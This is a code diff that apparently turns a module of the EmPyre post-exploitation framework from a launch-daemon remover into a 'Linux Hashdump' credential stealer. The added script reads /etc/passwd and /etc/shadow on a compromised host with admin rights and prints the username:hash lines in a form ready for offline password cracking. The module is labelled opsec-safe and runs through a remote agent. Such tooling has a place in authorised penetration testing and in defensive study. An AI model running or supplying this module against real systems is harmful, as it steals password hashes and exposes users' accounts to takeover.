@@ -7,26 +7,26 @@ class Module:
         # metadata info about the module, not modified during runtime
         self.info = {
             # name for the module that will appear in module menus
-            'Name': 'RemoveLaunchDaemon',
+            'Name': 'Linux Hashdump',
 
             # list of one or more authors for the module
-            'Author': ['@xorrior'],
+            'Author': ['@harmj0y'],
 
             # more verbose multi-line description of the module
-            'Description': ('Remove an EmPyre Launch Daemon.'),
+            'Description': ("Extracts the /etc/passwd and /etc/shadow, unshadowing the result."),
 
             # True if the module needs to run in the background
             'Background' : False,
 
             # File extension to save the file as
-            'OutputExtension' : None,
+            'OutputExtension' : "",
 
             # if the module needs administrative privileges
             'NeedsAdmin' : True,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
             'OpsecSafe' : True,
-            
+
             # list of any references/other comments
             'Comments': []
         }
@@ -40,18 +40,7 @@ class Module:
                 'Description'   :   'Agent to execute module on.',
                 'Required'      :   True,
                 'Value'         :   ''
-            },
-            'PlistPath' : {
-                'Description'   :   'Full path to the plist file to remove.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'ProgramPath' : {
-                'Description'   :   'Full path to the bash script/ binary file to remove.',
-                'Required'      :   True,
-                'Value'         :   ''
             }
-
         }
 
         # save off a copy of the mainMenu object to access external functionality
@@ -69,28 +58,30 @@ class Module:
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-
     def generate(self):
-        
-        plistpath = self.options['PlistPath']['Value']
-        programpath = self.options['ProgramPath']['Value']
-
-
 
         script = """
-import subprocess 
+f = open("/etc/passwd")
+passwd = f.readlines()
+f.close()
 
-process = subprocess.Popen('launchctl unload %s', stdout=subprocess.PIPE, shell=True)
-process.communicate()
+f2 = open("/etc/shadow")
+shadow = f2.readlines()
+f2.close()
 
-process = subprocess.Popen('rm %s', stdout=subprocess.PIPE, shell=True)
-process.communicate()
+users = {}
 
-process = subprocess.Popen('rm %s', stdout=subprocess.PIPE, shell=True)
-process.communicate()
+for line in shadow:
+    parts = line.strip().split(":")
+    username, pwdhash = parts[0], parts[1]
+    users[username] = pwdhash
 
-print "\\n [+] %s has been removed"
-print "\\n [+] %s has been removed"
-""" %(plistpath,plistpath,programpath,plistpath,programpath)
+for line in passwd:
+    parts = line.strip().split(":")
+    username = parts[0]
+    info = ":".join(parts[2:])
+    if username in users:
+        print "%s:%s:%s" %(username, users[username], info)
+"""
 
         return script
